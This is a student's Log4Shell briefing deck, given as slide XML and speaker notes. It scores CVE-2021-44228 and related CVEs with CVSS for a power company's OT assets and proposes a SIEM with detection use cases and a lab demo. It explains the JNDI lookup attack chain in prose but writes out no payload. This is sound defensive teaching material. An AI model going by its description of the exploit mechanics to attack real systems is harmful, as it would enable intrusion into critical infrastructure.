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presenting a SOC analyst's view of Log4Shell — CVE-2021-44228 — the Apache Log4j flaw disclosed in December 2021. The brief has two parts: first I score the vulnerability using CVSS to show exactly how dangerous it is and where to prioritise; then I propose a SIEM deployment and demonstrate how it detects an exploitation attempt end to end. Aim for about ten to twelve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parts. Task one is the CVSS analysis: I'll explain the flaw, derive its base score of ten out of ten, then layer on temporal and environmental context and compare the three CVSS versions. Task two is the SIEM proposal: why a SIEM is the right tool here, the architecture and the log sources it needs, four layered detection use cases, and a walkthrough of the recorded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flaw in one sentence: Log4j is a logging library that could run code hidden inside the very data it was asked to log. Log4j 2 supported "lookups" — the dollar-brace-jndi syntax on screen. In vulnerable versions it expanded that expression even when it arrived as untrusted input. So an attacker just had to get this string logged — in an HTTP header, a form field, a username — and the server would reach out to an attacker-controlled server, download a Java class and execute it. That's unauthenticated remote code execution. It's catalogued as CVE-2021-44228, weakness class CWE-917 expression injection, and it maps to ATT&amp;CK technique T1190, exploiting a public-facing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attack has five steps, and the important thing is who performs them. In red, the attacker only controls two: crafting the input, and standing up the malicious directory server. Everything in blue — logging the string, making the outbound lookup, and executing the code — the victim's own server does. That's what makes it so dangerous: the server attacks itself. But notice the flip side, at the bottom: steps two, three and five all happen inside your infrastructure, which means your logs can see them. Hold that thought for Task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did this matter so much? Three numbers. Over thirty-five thousand Java packages were affected — more than eight percent of the entire Maven Central repository — and most were affected indirectly, through dependencies teams didn't even know they had. Weaponised exploit code and mass scanning appeared within a day of disclosure. And the US Cyber Safety Review Board later called it an "endemic" vulnerability, expected to be exploited into the 2030s. The CISA director called it one of the most serious vulnerabilities of her career. So the scale was enormous and patching alone was never going to be enough — which is the case for investing in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specific scenario, and it's what makes this analysis more than a textbook exercise. We're a power company, and four of our assets use Java or embed Log4j. The SIMATIC IT Report Manager, a Java reporting product that sits on the IT-OT boundary and is network-reachable. The OPC UA Java Stack, buried deep in the SCADA and EMS core that talks to our controllers. And the Siemens Connect X200 and X300 telecontrol gateways out at our substations. The critical point is at the bottom: a compromise of these isn't a data breach, it's loss of view and control over physical grid equipment. Integrity and availability here have safety consequences. That reasoning drives every CVSS environmental score and every SIEM choice I'm about to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scoring, the rubric asks me to comprehensively identify the vulnerabilities — and the important insight is that Log4Shell isn't one CVE, it's a family, and the rushed patches actually created new ones. I scored all four myself. 44228, the original, is my ten out of ten. But 45046 — the first fix, 2.15.0, turned out to be incomplete, and it's still remote code execution, which I scored 9.0, Critical, the higher complexity pulling it just below ten. 45105 is a denial-of-service through recursive lookups, 5.9 Medium. And 44832 is another RCE but it needs the attacker to control configuration, so 6.6 Medium. The practical lesson, at the bottom: for our Siemens assets, the finish line is 2.17.1, not 2.15.0 — and each product has to be checked against Siemens ProductCERT advisories.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to Task one. CVSS — the Common Vulnerability Scoring System, maintained by FIRST — is the industry standard for expressing how severe a vulnerability is, on a scale of zero to ten. It has three metric groups. Base captures the intrinsic qualities of the flaw and is the same for everyone. Temporal adjusts for how the threat evolves over time — is there working exploit code, is there a patch. And Environmental tailors the score to your specific deployment. I'll work through all three for Log4Shell.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core of Task one — and I want to stress this is my own determination, justified metric by metric, not a copied number. Attack Vector is Network: the payload arrives over the network. Attack Complexity is Low: one request works, reliably. Privileges Required, None — no login. User Interaction, None — logging is automatic. Scope is Changed, and this is the key one: the flaw breaks out of the logging library to compromise the whole host, so it crosses a security boundary. And Confidentiality, Integrity and Availability are all High because arbitrary code execution means total loss on all three. Put together, both halves of the equation max out, and the base score is a perfect ten out of ten — Critical. There's the vector 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Temporal metrics adjust for how the threat evolved, and I set three. Exploit Code Maturity: High — weaponised exploits and mass scanning appeared within a day. Remediation Level: Official Fix — Apache shipped a patch, and this is the only factor pulling the score down at all. Report Confidence: Confirmed — vendor-confirmed and reproduced everywhere. That gives 9.5, still Critical. And the key point in the string at the bottom: in the first days, before any patch existed, Remediation Level would be Unavailable, and the temporal score would sit at the full ten. The most dangerous window is always before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context earns its keep. Environmental scoring lets me re-score the same flaw for each of our assets, and I made a deliberate choice: for all three I set Integrity Requirement and Availability Requirement to High, because corrupted control data or lost availability threatens the grid itself. What differs is reachability. The SIMATIC Report Manager is exposed at the IT-OT boundary with no mitigation — it stays 9.5, Critical, so it's fixed first. The Connect gateways are remotely reachable but hardened, so I set Modified Attack Complexity High — 8.7. The OPC UA stack is deep in segmented OT, only adjacent-reachable, so Modified Attack Vector Adjacent plus complexity High — 8.0. And the lesson at the bottom is the whole point of doing this in an OT context: you cannot deprioritise an OT asset the way you might a low-value IT box, because the high integrity and availability requirements keep everything at least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analysis on one chart, and it also shows why the CVSS version matters. Under the old version two, the same flaw scores 9.3 — because version two had no Scope metric, it couldn't capture the break-out, so it can't reach ten. Version 3.1, which I based my analysis on, adds Scope and gives the full ten. Version 4.0 restructures impact into vulnerable-system and subsequent-system metrics and still lands at ten. In the middle you can see our three environmental scores spreading from 9.5 down to 8.0. The takeaway on the right: always cite which version a score came from, because the same flaw reads anywhere from 9.3 to 10 depending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to Task two, the SIEM. First, why a SIEM at all? Because no single log proves Log4Shell. The web log shows the payload string, the firewall shows the strange outbound LDAP connection, the OT sensor shows a gateway behaving oddly — individually easy to dismiss. The SIEM is the one place those weak signals line up, on one asset, within seconds. And which SIEM in our context? I'm proposing Splunk Enterprise Security — it has risk-based alerting, published Log4Shell detections and ATT&amp;CK mapping, and an OT add-on — and I'll note the demo reproduces it for free with Wazuh or Elastic. Crucially, I pair it with a passive OT monitoring sensor like Nozomi or Claroty, because you cannot install endpoint agents on controllers or the Siemens gateways — the sensor watches the network and feeds the SIEM.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reference architecture. Four stages, left to right. Diverse log sources — and note these span both IT and OT: the DMZ web logs from the SIMATIC Report Manager, the IT-OT boundary firewall, DNS, and the OT side — Connect gateway syslog, OPC UA, the historian. Those feed lightweight collectors, which forward over encrypted transport to the SIEM. The SIEM parses and normalises everything, correlates it against Log4Shell use cases, and enriches it with threat intel and asset context — including which Purdue zone an asset sits in. The outputs drive the SOC: triage, automated response, dashboards, incident response and compliance. The next three slides drill into exactly what this pipeline needs — its inputs, its insights, and its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rubric asks me to individually identify the SIEM inputs and justify each in the context of this incident. Six. Web and application logs from the SIMATIC Report Manager and our Java apps — because the JNDI payload lands here first, in URLs, headers, form fields. The IT-OT boundary firewall and proxy — because a server, especially an OT box, making an outbound LDAP or RMI connection is the exploitation tell; it should never do that. DNS logs — because the JNDI callback resolves an attacker or canary domain, and that's visible even if the inbound request was encrypted. OT telemetry — the Connect gateway syslog, OPC UA and the historian, fed by a passive sensor where no agent can run. Endpoint telemetry — Java spawning a shell is proof an attempt worked. And the vulnerability-scan and SBOM inventory — because knowing which assets actually run vulnerable Log4j is what turns a noisy alert into a prioritised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the insights — what the SIEM must detect, and these are layered on purpose. Signatures catch the noisy scanning; behavioural rules catch the quiet attacker who evades the string but still has to call out or execute. Insight one: the inbound JNDI payload and its encodings in web traffic — that catches the mass exploitation, ATT&amp;CK T1190. Insight two, behavioural: a Java server or an OT gateway making an outbound LDAP or RMI connection to those ports — almost never legitimate, especially in OT. Insight three is the flagship and it's why we need a SIEM specifically: correlating the two — the same host receives a payload and then calls out within minutes — two weak signals combine into one high-confidence alert with very few false positives. And insight four: post-exploitation — Java spawning a shell or a downloader, which is the trigger to isolate. Each is mapped to an ATT&amp;CK technique so analysts get consistent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the actions — and the OT context changes these more than anything. In OT, automation has to be safety-gated: you block at the IT-OT boundary, but you never automatically isolate a live controller, because pulling a device offline could itself cause an outage. A human confirms before anything touches the grid. So: Contain — SOAR blocks the source IP at the boundary and denies the outbound callback, and it isolates IT hosts automatically but only quarantines OT with operator sign-off. Enrich and prioritise — cross-check the SBOM to confirm the asset is actually vulnerable, attach the CVSS environmental score and Purdue zone, and auto-raise severity for that exposed SIMATIC box. And Respond and report — open an incident ticket, notify both on-call and OT engineers, retrospectively hunt stored logs for earlier attempts, and keep the evidence trail for NIST 800-61 and the audit that prompted this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demonstration itself, which I'll walk through in the recording. It runs entirely in an isolated lab — a deliberately vulnerable Java service, an attacker host, and a free SIEM, using documentation IP ranges and reserved domains, so nothing live is ever touched. Five steps. One: establish a quiet baseline. Two: send the JNDI payload in an HTTP header. Three: the signature detection, insight one, fires within seconds — I open it and show the offending request. Four: the vulnerable server makes its outbound callback, and the correlated alert, insight three, ties payload to callback on the same host. Five: I walk the analyst response — triage, confirm the asset is vulnerable via the SBOM, and run the SOAR playbook. As required, the recording will be on Zoom with my camera on and my student ID shown, and the link goes in with the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honest appraisal, because the argument for the SIEM has to acknowledge its limits. The benefits: cross-source correlation that no single tool can do; lower mean time to detect and respond, plus the ability to hunt stored logs retrospectively; threat-intel enrichment from feeds like CISA KEV and Siemens ProductCERT; and an audit trail — which matters, since this whole exercise came out of a security audit. The limits, each with our mitigation: a SIEM only sees what it ingests, so we need an onboarding checklist tied to the asset inventory; signature rules are noisy, so we lean on risk-based and correlated alerting; encryption can hide the payload, so we rely on behavioural detections; and we can't put agents on OT devices, so we feed the SIEM from a passive network sensor. None of these is a reason not to deploy — they're design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three takeaways. First, Log4Shell is a maximal ten out of ten — but not everywhere equally, and the environmental scoring, from 9.5 down to 8.0, is exactly how we sequence remediation across our OT estate. Second, patching alone was never enough: it's a family of CVEs, buried in the software supply chain and in OT firmware, so detection has to run alongside remediation. And third, the SIEM is what makes that detection real — with the right inputs, correlated insights and safety-gated actions, it turns three weak signals into one high-confidence alert, and lets us see an attempt before it becomes a grid incident. Thank you — I'll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my references, in IEEE style — the CVSS specifications from FIRST, the NVD and CVE records, CISA and the Cyber Safety Review Board, the Australian ACSC advisory, Siemens ProductCERT, and the Splunk and Wazuh detection guidance I drew the use cases from. The full list with URLs is in the accompanying report.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6"/>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7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>COMP2004 · ASSESSMENT 2 · SOC ANALYST BRIEF</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1737360"/>
            <a:ext cx="10515600" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="6000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The Log4Shell Vulnerability</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3794760"/>
            <a:ext cx="10789920" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CVSS analysis &amp; a SIEM proposal for a </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>power company</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>  —  CVE-2021-44228 and its family</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5943600"/>
            <a:ext cx="10972800" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A97A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Presented by </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A. Student</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A97A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>        Security Operations Centre        24 September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1C5CAB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>AGENDA</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3300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What this brief covers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1920240"/>
            <a:ext cx="5394960" cy="4023360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2045"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln/>
          <a:effectLst>
            <a:outerShdw sx="100000" sy="100000" kx="0" ky="0" algn="bl" rotWithShape="0" blurRad="76200" dist="25400" dir="5400000">
              <a:srgbClr val="9AA3B0">
                <a:alpha val="25000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1920240"/>
            <a:ext cx="5394960" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 41667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2E6FD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2194560"/>
            <a:ext cx="4572000" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Task 1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2697480"/>
            <a:ext cx="466344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CVSS analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="3383280"/>
            <a:ext cx="4663440" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>How the flaw works</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Base metrics → a score of 10.0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Temporal &amp; environmental context</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>v2.0 vs v3.1 vs v4.0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="1920240"/>
            <a:ext cx="5394960" cy="4023360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2045"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln/>
          <a:effectLst>
            <a:outerShdw sx="100000" sy="100000" kx="0" ky="0" algn="bl" rotWithShape="0" blurRad="76200" dist="25400" dir="5400000">
              <a:srgbClr val="9AA3B0">
                <a:alpha val="25000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="1920240"/>
            <a:ext cx="5394960" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 41667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D14343"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="2194560"/>
            <a:ext cx="4572000" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D14343"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Task 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="2697480"/>
            <a:ext cx="466344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SIEM proposal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="3383280"/>
            <a:ext cx="4663440" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Which platform, and why in context</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Inputs — what to ingest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Insights — what to detect</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Actions — what to do, plus a demo</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B"/>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1C5CAB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>THE FLAW IN ONE SENTENCE</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3000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
